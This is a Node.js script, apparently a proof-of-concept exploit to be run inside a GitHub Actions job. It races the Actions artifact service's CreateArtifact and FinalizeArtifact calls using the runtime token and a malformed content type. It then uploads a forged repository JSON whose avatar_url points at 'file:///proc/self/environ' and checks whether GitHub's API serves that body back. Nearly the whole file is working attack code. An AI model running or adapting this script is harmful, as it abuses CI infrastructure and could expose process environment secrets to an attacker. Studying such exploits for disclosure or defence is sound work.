'use strict';

const crypto = require('node:crypto');
const fs = require('node:fs');
const https = require('node:https');
const tls = require('node:tls');

const ARTIFACT_SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD_TYPE = '\x85application/json';
const EXPECTED_TYPE_HEX = Buffer.from(ODD_TYPE, 'latin1').toString('hex');
const MAX_RESPONSE = 2 * 1024 * 1024;
const CANDIDATES = 24;

function fail(message) {
  throw new Error(message);
}

function sleep(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

function backendIds(token) {
  const pieces = token.split('.');
  if (pieces.length < 2) fail('ACTIONS_RUNTIME_TOKEN is not a JWT');
  const claims = JSON.parse(Buffer.from(pieces[1], 'base64url').toString('utf8'));
  const scope = String(claims.scp || '')
    .split(' ')
    .find((item) => item.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) fail('Actions.Results scope is unavailable');
  return {workflowRunBackendId: fields[1], workflowJobRunBackendId: fields[2]};
}

function request(urlString, {method = 'GET', headers = {}, body = null} = {}) {
  const url = new URL(urlString);
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

async function twirp(method, token, value) {
  const resultsOrigin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const url = new URL(`/twirp/${ARTIFACT_SERVICE}/${method}`, resultsOrigin);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request(url.href, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    const error = new Error(`${method} returned HTTP ${response.status}`);
    error.status = response.status;
    throw error;
  }
  return JSON.parse(response.body.toString('utf8'));
}

async function putBlob(signedUrl, body) {
  const response = await request(signedUrl, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD_TYPE,
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    throw new Error(`blob upload returned HTTP ${response.status}`);
  }
}

function decodeChunked(body) {
  const chunks = [];
  let offset = 0;
  while (true) {
    const lineEnd = body.indexOf('\r\n', offset, 'latin1');
    if (lineEnd < 0) fail('truncated chunk-size line');
    const sizeToken = body.subarray(offset, lineEnd).toString('ascii').split(';', 1)[0];
    if (!/^[0-9a-fA-F]+$/.test(sizeToken)) fail('invalid chunk-size line');
    const size = Number.parseInt(sizeToken, 16);
    offset = lineEnd + 2;
    if (size === 0) return Buffer.concat(chunks);
    if (offset + size + 2 > body.length) fail('truncated chunk body');
    chunks.push(body.subarray(offset, offset + size));
    offset += size + 2;
  }
}

function parseRawResponse(raw) {
  const boundary = raw.indexOf('\r\n\r\n', 0, 'latin1');
  if (boundary < 0) fail('HTTP response omitted header terminator');
  const lines = raw.subarray(0, boundary).toString('latin1').split('\r\n');
  const statusMatch = /^HTTP\/1\.[01] (\d{3})/.exec(lines.shift() || '');
  if (!statusMatch) fail('invalid HTTP status line');
  const headers = new Map();
  for (const line of lines) {
    const colon = line.indexOf(':');
    if (colon < 1) continue;
    const name = line.slice(0, colon).toLowerCase();
    const value = line.slice(colon + 1).replace(/^[ \t]+/, '');
    if (!headers.has(name)) headers.set(name, []);
    headers.get(name).push(value);
  }
  let body = raw.subarray(boundary + 4);
  const transferEncoding = (headers.get('transfer-encoding') || []).join(',').toLowerCase();
  if (transferEncoding.split(',').map((item) => item.trim()).includes('chunked')) {
    body = decodeChunked(body);
  } else if (headers.has('content-length')) {
    body = body.subarray(0, Number(headers.get('content-length')[0]));
  }
  return {status: Number(statusMatch[1]), headers, body};
}

function rawTlsGet(urlString, headers = {}) {
  const url = new URL(urlString);
  if (url.protocol !== 'https:') fail('raw verifier requires HTTPS');
  const authority = url.port ? `${url.hostname}:${url.port}` : url.hostname;
  const lines = [
    `GET ${url.pathname}${url.search} HTTP/1.1`,
    `Host: ${authority}`,
    'Connection: close',
    'Accept-Encoding: identity',
    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
    '',
    '',
  ];
  return new Promise((resolve, reject) => {
    const chunks = [];
    let length = 0;
    let settled = false;
    const finish = (error, value) => {
      if (settled) return;
      settled = true;
      error ? reject(error) : resolve(value);
    };
    const socket = tls.connect({
      host: url.hostname,
      port: Number(url.port || 443),
      servername: url.hostname,
      ALPNProtocols: ['http/1.1'],
    }, () => socket.write(Buffer.from(lines.join('\r\n'), 'latin1')));
    socket.setTimeout(20000, () => socket.destroy(new Error('TLS timeout')));
    socket.on('data', (chunk) => {
      length += chunk.length;
      if (length > MAX_RESPONSE) {
        socket.destroy(new Error('oversized response'));
        return;
      }
      chunks.push(Buffer.from(chunk));
    });
    socket.on('end', () => {
      try {
        finish(null, parseRawResponse(Buffer.concat(chunks)));
      } catch (error) {
        finish(error);
      }
    });
    socket.on('error', (error) => finish(error));
  });
}

function firstHeader(response, name) {
  return (response.headers.get(name.toLowerCase()) || [''])[0];
}

function payload(repositoryPath) {
  return Buffer.from(JSON.stringify({
    full_name: repositoryPath,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette v6/v7 race carrier',
    stargazers_count: 0,
  }));
}

async function verifyArtifact(repositoryPath, githubToken, expectedBody) {
  const endpoint = `https://api.github.com/repos/${repositoryPath}`;
  let response;
  for (let attempt = 0; attempt < 8; attempt += 1) {
    response = await rawTlsGet(endpoint, {
      Accept: 'application/vnd.github.v3+json',
      Authorization: `Bearer ${githubToken}`,
      'User-Agent': 'repo-cassette-race-verifier',
      'X-GitHub-Api-Version': '2022-11-28',
    });
    if (![404, 409].includes(response.status)) break;
    await sleep(600);
  }
  if (response.status >= 300 && response.status < 400) {
    const location = firstHeader(response, 'location');
    if (!location) fail('artifact redirect omitted Location');
    response = await rawTlsGet(new URL(location, endpoint).href, {
      'User-Agent': 'repo-cassette-race-verifier',
    });
  }
  const contentTypeHex = Buffer.from(firstHeader(response, 'content-type'), 'latin1').toString('hex');
  return {
    status: response.status,
    contentTypeHex,
    bodyMatch: response.body.equals(expectedBody),
    digest: crypto.createHash('sha256').update(response.body).digest('hex'),
  };
}

function output(name, value) {
  if (process.env.GITHUB_OUTPUT) {
    fs.appendFileSync(process.env.GITHUB_OUTPUT, `${name}=${value}\n`);
  }
}

async function createCandidate(index, token, ids, githubRepository) {
  const common = {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
    name: `repo-cassette-race-${process.env.GITHUB_RUN_ID}-${index}-${Date.now()}`,
  };
  const specifications = index % 2 === 0
    ? [[6, ODD_TYPE], [7, 'application/json']]
    : [[7, 'application/json'], [6, ODD_TYPE]];
  const creations = await Promise.allSettled(specifications.map(([version, mimeType]) =>
    twirp('CreateArtifact', token, {...common, version, mime_type: mimeType})));
  const created = creations
    .filter((item) => item.status === 'fulfilled' && item.value?.ok)
    .map((item) => item.value);
  if (created.length !== 2) {
    return {index, stage: 'create', created: created.length};
  }

  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await Promise.all(created.map((item) => putBlob(item.signed_upload_url, placeholder)));
  const finalizeInput = {...common, size: String(placeholder.length)};
  const finalizations = await Promise.allSettled([
    twirp('FinalizeArtifact', token, finalizeInput),
    twirp('FinalizeArtifact', token, finalizeInput),
  ]);
  const artifactIds = [...new Set(finalizations
    .filter((item) => item.status === 'fulfilled' && item.value?.ok)
    .map((item) => String(item.value.artifact_id))
    .filter((item) => /^\d+$/.test(item)))];
  if (!artifactIds.length) return {index, stage: 'finalize', artifactIds};

  const checks = [];
  for (const artifactId of artifactIds) {
    const repositoryPath = `${githubRepository}/actions/artifacts/${artifactId}/zip`;
    const body = payload(repositoryPath);
    await Promise.all(created.map((item) => putBlob(item.signed_upload_url, body)));
    await sleep(250);
    try {
      const wire = await verifyArtifact(repositoryPath, process.env.GITHUB_TOKEN, body);
      checks.push({artifactId, repositoryPath, wire});
      if (wire.status === 200 && wire.contentTypeHex === EXPECTED_TYPE_HEX && wire.bodyMatch) {
        return {index, winner: true, artifactId, repositoryPath, wire};
      }
    } catch (error) {
      checks.push({artifactId, error: error.message});
    }
  }
  return {index, winner: false, artifactIds, checks};
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const githubToken = process.env.GITHUB_TOKEN;
  const githubRepository = process.env.GITHUB_REPOSITORY;
  if (!token || !githubToken || !githubRepository) fail('GitHub Actions environment is incomplete');
  const ids = backendIds(token);
  const rows = [];

  for (let offset = 0; offset < CANDIDATES; offset += 4) {
    const batch = [];
    for (let index = offset; index < Math.min(offset + 4, CANDIDATES); index += 1) {
      batch.push(createCandidate(index, token, ids, githubRepository));
    }
    const settled = await Promise.allSettled(batch);
    for (const item of settled) {
      const row = item.status === 'fulfilled' ? item.value : {error: item.reason?.message || String(item.reason)};
      rows.push(row);
      console.log(`RACE_RESULT ${JSON.stringify(row)}`);
      if (row.winner) {
        output('winner_artifact_id', row.artifactId);
        output('winner_repository', row.repositoryPath);
        console.log(`RACE_WINNER ${JSON.stringify(row)}`);
        return;
      }
    }
  }

  const summary = {
    candidates: rows.length,
    contentTypes: rows.flatMap((row) => row.checks || []).map((item) => item.wire?.contentTypeHex || null),
  };
  console.log(`RACE_SUMMARY ${JSON.stringify(summary)}`);
  throw new Error('no verified v6/v7 race carrier was produced');
}

main().catch((error) => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
